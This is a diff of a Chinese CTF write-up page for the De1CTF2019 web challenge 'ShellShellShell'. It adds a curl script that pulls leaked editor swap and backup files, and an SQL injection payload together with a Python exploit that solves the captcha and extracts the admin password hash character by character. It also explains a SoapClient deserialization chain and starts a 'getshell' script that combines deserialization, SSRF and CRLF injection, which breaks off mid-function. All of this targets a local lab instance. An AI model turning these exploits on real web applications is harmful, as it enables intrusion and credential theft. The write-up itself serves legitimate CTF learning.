@@ -3133,6 +3133,33 @@
     ShellShellShell
   </a>
   
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="源码泄露" class="md-nav__link">
+    源码泄露
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql" title="SQL注入" class="md-nav__link">
+    SQL注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="反序列化" class="md-nav__link">
+    反序列化
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
       
@@ -3420,6 +3447,33 @@
     ShellShellShell
   </a>
   
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="源码泄露" class="md-nav__link">
+    源码泄露
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql" title="SQL注入" class="md-nav__link">
+    SQL注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="反序列化" class="md-nav__link">
+    反序列化
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
       
@@ -3449,6 +3503,7 @@
                 
                 <h1 id="de1ctf2019">De1CTF2019<a class="headerlink" href="#de1ctf2019" title="Permanent link">&para;</a></h1>
 <h2 id="shellshellshell">ShellShellShell<a class="headerlink" href="#shellshellshell" title="Permanent link">&para;</a></h2>
+<h3 id="_1">源码泄露<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
 <p>利用<code>dirsearch</code>扫描服务器还有哪些文件, 发现存在</p>
 <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
 2
@@ -3471,14 +3526,506 @@
 <p>在<code>index.php</code>中发现require <code>user.php</code>, 还会require <code>views</code>目录中的 <code>delete|index|login|logout|phpinfo|profile|publish|register</code>, 通过GET参数中的action控制页面跳转</p>
 <p>在<code>user.php</code>中发现需要下载<code>user.php.bak</code>, <code>user.php</code>中require <code>config.php</code></p>
 <p>使用<code>register</code>注册, 破解md5, 使用<code>login</code>登录, 到<code>index</code>. <code>profile</code>设置是否允许不同ip登录, <code>publish</code>允许输入两个参数<code>signature</code>和<code>mood</code>, 在<code>index</code>页面显示, <code>delete</code>删除, <code>logout</code>退出</p>
-<p><code>publish</code>调用<code>insert</code>往数据库中插入数据, SQL语句拼接, 且<code>signature</code>可控</p>
+<details class="snippet"><summary>源码泄露</summary><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="c1">#coding=utf-8</span>
+<span class="c1"># import requests</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;mkdir source&#39;</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;mkdir source/views&#39;</span><span class="p">)</span>
+<span class="n">file_list</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;.index.php.swp&#39;</span><span class="p">,</span><span class="s1">&#39;.config.php.swp&#39;</span><span class="p">,</span><span class="s1">&#39;.user.php.swp&#39;</span><span class="p">,</span><span class="s1">&#39;user.php.bak&#39;</span><span class="p">,</span><span class="s1">&#39;views/.delete.swp&#39;</span><span class="p">,</span><span class="s1">&#39;views/.index.swp&#39;</span><span class="p">,</span><span class="s1">&#39;views/.login.swp&#39;</span><span class="p">,</span><span class="s1">&#39;views/.logout.swp&#39;</span><span class="p">,</span><span class="s1">&#39;views/.profile.swp&#39;</span><span class="p">,</span><span class="s1">&#39;views/.publish.swp&#39;</span><span class="p">,</span><span class="s1">&#39;views/.register.swp&#39;</span><span class="p">]</span>
+<span class="n">part_url</span><span class="o">=</span><span class="s1">&#39;http://127.0.0.1:11027/&#39;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">file_list</span><span class="p">:</span>
+    <span class="n">url</span><span class="o">=</span><span class="n">part_url</span><span class="o">+</span><span class="n">i</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;download </span><span class="si">%s</span><span class="s1"> &#39;</span> <span class="o">%</span> <span class="n">url</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;curl &#39;</span><span class="o">+</span><span class="n">url</span><span class="o">+</span><span class="s1">&#39;&gt;source/&#39;</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</pre></div>
+</td></tr></table>
+
+</details>
+<h3 id="sql">SQL注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h3>
+<p><code>publish</code></p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>- 调用`serialize`把`Mood`序列化
+- 调用`insert`往数据库中插入数据, SQL语句拼接, 且`signature`可控
+</pre></div>
+</td></tr></table>
+
 <p><code>$columns</code>改成<code>`userid`,`username`,`signature`,`mood`</code>, <code>$value</code>改成<code>(...)</code>, 并且一对反引号中的内容如果不存在反引号+逗号, 就把反引号改为单引号</p>
-<p>md5解密为<code>jaivypassword</code></p>
+<p>直接使用<code>a`, (select password from ctf_users where is_admin=1 limit 1)); #</code>, Mood没有序列化</p>
+<p>使用<a href="http://www.chamd5.org/">查MD5</a>md5解密为<code>jaivypassword</code></p>
+<details class="snippet"><summary>SQL注入</summary><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="c1">#coding=utf-8</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
+
+<span class="n">_target</span><span class="o">=</span><span class="s1">&#39;http://127.0.0.1:11027/index.php?action=&#39;</span>
+
+<span class="k">def</span> <span class="nf">get_code_dict</span><span class="p">():</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []{}&lt;&gt;~`+=,.;:/?|&#39;</span>
+    <span class="n">captchas</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">product</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">3</span><span class="p">)]</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] Genering {} captchas...&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">captchas</span><span class="p">)))</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;captchas.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">captchas</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">k</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">+</span><span class="s1">&#39; --&gt; &#39;</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_creds</span><span class="p">():</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">))</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span>
+
+<span class="k">def</span> <span class="nf">solve_code</span><span class="p">(</span><span class="n">html</span><span class="p">):</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]{5})\)&#39;</span><span class="p">,</span> <span class="n">html</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">solution</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;grep&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="o">+</span><span class="n">code</span><span class="p">,</span> <span class="s1">&#39;captchas.txt&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">solution</span>
+
+<span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">_target</span><span class="o">+</span><span class="s1">&#39;register&#39;</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">solve_code</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">_target</span><span class="o">+</span><span class="s1">&#39;register&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s1">&#39;code&#39;</span><span class="p">:</span><span class="n">code</span><span class="p">})</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">_target</span><span class="o">+</span><span class="s1">&#39;login&#39;</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">solve_code</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">_target</span><span class="o">+</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s1">&#39;code&#39;</span><span class="p">:</span><span class="n">code</span><span class="p">})</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">publish</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">mood</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">_target</span><span class="o">+</span><span class="s1">&#39;publish&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;signature&#39;</span><span class="p">:</span><span class="n">sig</span><span class="p">,</span><span class="s1">&#39;mood&#39;</span><span class="p">:</span><span class="n">mood</span><span class="p">})</span>
+
+<span class="n">get_code_dict</span><span class="p">()</span>
+
+<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="n">get_creds</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] register({}, {})&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
+<span class="n">register</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] login({}, {})&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
+<span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] user session =&gt; &#39;</span> <span class="o">+</span> <span class="n">sess</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">])</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">33</span><span class="p">):</span> <span class="c1"># we know password is 32 chars (md5)</span>
+    <span class="n">mood</span> <span class="o">=</span> <span class="s1">&#39;(select concat(`O:4:</span><span class="se">\&quot;</span><span class="s1">Mood</span><span class="se">\&quot;</span><span class="s1">:3:{{s:4:</span><span class="se">\&quot;</span><span class="s1">mood</span><span class="se">\&quot;</span><span class="s1">;i:`,ord(substr(password,{},1)),`;s:2:</span><span class="se">\&quot;</span><span class="s1">ip</span><span class="se">\&quot;</span><span class="s1">;s:14:</span><span class="se">\&quot;</span><span class="s1">80.212.199.161</span><span class="se">\&quot;</span><span class="s1">;s:4:</span><span class="se">\&quot;</span><span class="s1">date</span><span class="se">\&quot;</span><span class="s1">;i:1520664478;}}`) from ctf_users where is_admin=1 limit 1)&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a`, {}); -- -&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">mood</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">publish</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+
+<span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">_target</span><span class="o">+</span><span class="s1">&#39;index&#39;</span><span class="p">)</span>
+<span class="n">moods</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;img/([0-9]+)\.gif&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># last publish will be read first in the html</span>
+<span class="n">admin_hash</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">k</span><span class="p">:</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">k</span><span class="p">)),</span> <span class="n">moods</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] admin hash =&gt; &#39;</span> <span class="o">+</span> <span class="n">admin_hash</span><span class="p">)</span>
+</pre></div>
+</td></tr></table>
+
+</details>
+<h3 id="_2">反序列化<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
 <p>但是使用admin登录返回<code>You can only login at the usual address</code></p>
-<p>https://www.xctf.org.cn/library/details/79378efa88bff52451b2f822abe562d29ae7aade/</p>
-<p>https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/ShellShellShell/README_zh.md</p>
-<p>https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/web/ShellShellShell/dockerfile</p>
-<p><a href="https://mp.weixin.qq.com/s?src=11&amp;timestamp=1565858991&amp;ver=1791&amp;signature=hIX-hA2DxsOWzLHCIU*ONH0q*E4MWL0i*qmhQnBIqlmpZh6KD9ehk8XcyEuhmnnYbNa2g8jNrYwm44C5zZchM*Nb*lV1buaXryI1huMoEZuY88CG8usGQF55mPb6TDGl&amp;new=1">Docker教程：Docker Compose入门</a></p>
+<p>在<code>login()</code>中有判断<code>$_SERVER['REMOTE_ADDR']</code>, 需要伪造访问的IP地址</p>
+<p>在<code>showmess</code>中调用<code>unserialize</code>反序列化, 可以利用SQL注入产生反序列化漏洞</p>
+<p>直接访问<a href="http://127.0.0.1:11027/phpinfo.php">http://127.0.0.1:11027/phpinfo.php</a>, 看到enable了<code>soap</code></p>
+<p>php内置类<a href="https://www.php.net/manual/zh/class.soapclient.php">SoapClient</a>存在magic函数<code>__call()</code></p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nx">SoapClient</span> <span class="p">{</span>
+    <span class="cm">/* 方法 */</span>
+    <span class="c1">// $wsdl:</span>
+        <span class="c1">// URI of the WSDL file</span>
+        <span class="c1">// NULL if working in non-WSDL mode.</span>
+        <span class="c1">// 如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求</span>
+    <span class="c1">// $options:</span>
+        <span class="c1">// WSDL: optional.</span>
+        <span class="c1">// non-WSDL mode: location is the URL of the SOAP server and</span>
+        <span class="c1">// uri is the target namespace of the SOAP service.</span>
+            <span class="c1">// The user_agent option specifies string to use in User-Agent header.</span>
+    <span class="k">public</span> <span class="nx">SoapClient</span> <span class="p">(</span> <span class="nx">mixed</span> <span class="nv">$wsdl</span> <span class="p">[,</span> <span class="k">array</span> <span class="nv">$options</span> <span class="p">]</span> <span class="p">)</span>
+    <span class="k">public</span> <span class="nx">__call</span> <span class="p">(</span> <span class="nx">string</span> <span class="nv">$function_name</span> <span class="p">,</span> <span class="k">array</span> <span class="nv">$arguments</span> <span class="p">)</span> <span class="o">:</span> <span class="nx">mixed</span>
+<span class="p">}</span>
+
+<span class="nv">$sp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;http://127.0.0.1:8887&quot;</span><span class="p">,</span>
+                                 <span class="s1">&#39;uri&#39;</span>      <span class="o">=&gt;</span> <span class="s2">&quot;123&quot;</span><span class="p">));</span>
+<span class="c1">// O:10:&quot;SoapClient&quot;:4:{s:3:&quot;uri&quot;;s:3:&quot;123&quot;;s:8:&quot;location&quot;;s:21:&quot;http://127.0.0.1:8887&quot;;s:15:&quot;_stream_context&quot;;i:0;s:13:&quot;_soap_version&quot;;i:1;}</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$sp</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+</td></tr></table>
+
+<details class="snippet"><summary>反序列化 + SSRF + CRLF + getshell</summary><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9
+ 10
+ 11
+ 12
+ 13
+ 14
+ 15
+ 16
+ 17
+ 18
+ 19
+ 20
+ 21
+ 22
+ 23
+ 24
+ 25
+ 26
+ 27
+ 28
+ 29
+ 30
+ 31
+ 32
+ 33
+ 34
+ 35
+ 36
+ 37
+ 38
+ 39
+ 40
+ 41
+ 42
+ 43
+ 44
+ 45
+ 46
+ 47
+ 48
+ 49
+ 50
+ 51
+ 52
+ 53
+ 54
+ 55
+ 56
+ 57
+ 58
+ 59
+ 60
+ 61
+ 62
+ 63
+ 64
+ 65
+ 66
+ 67
+ 68
+ 69
+ 70
+ 71
+ 72
+ 73
+ 74
+ 75
+ 76
+ 77
+ 78
+ 79
+ 80
+ 81
+ 82
+ 83
+ 84
+ 85
+ 86
+ 87
+ 88
+ 89
+ 90
+ 91
+ 92
+ 93
+ 94
+ 95
+ 96
+ 97
+ 98
+ 99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
+
+<span class="n">_target</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:11027/&#39;</span>
+<span class="n">_action</span> <span class="o">=</span> <span class="n">_target</span> <span class="o">+</span> <span class="s1">&#39;index.php?action=&#39;</span>
+
+<span class="k">def</span> <span class="nf">get_code_dict</span><span class="p">():</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []{}&lt;&gt;~`+=,.;:/?|&#39;</span>
+    <span class="n">captchas</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">product</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">3</span><span class="p">)]</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] Genering {} captchas...&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">captchas</span><span class="p">)))</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;captchas.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">captchas</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">k</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">+</span><span class="s1">&#39; --&gt; &#39;</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">get_creds</span><span class="p">():</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">))</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span>
+
+<span class="c1">#code</span>
+<span class="k">def</span> <span class="nf">solve_code</span><span class="p">(</span><span class="n">html</span><span class="p">):</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]{5})\)&#39;</span><span class="p">,</span> <span class="n">html</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">solution</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;grep&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="o">+</span><span class="n">code</span><span class="p">,</span> <span class="s1">&#39;captchas.txt&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">solution</span>
+
+<span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;register&#39;</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">solve_code</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;register&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s1">&#39;code&#39;</span><span class="p">:</span><span class="n">code</span><span class="p">})</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;login&#39;</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">solve_code</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s1">&#39;code&#39;</span><span class="p">:</span><span class="n">code</span><span class="p">})</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">publish</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">mood</span><span class="p">):</span>
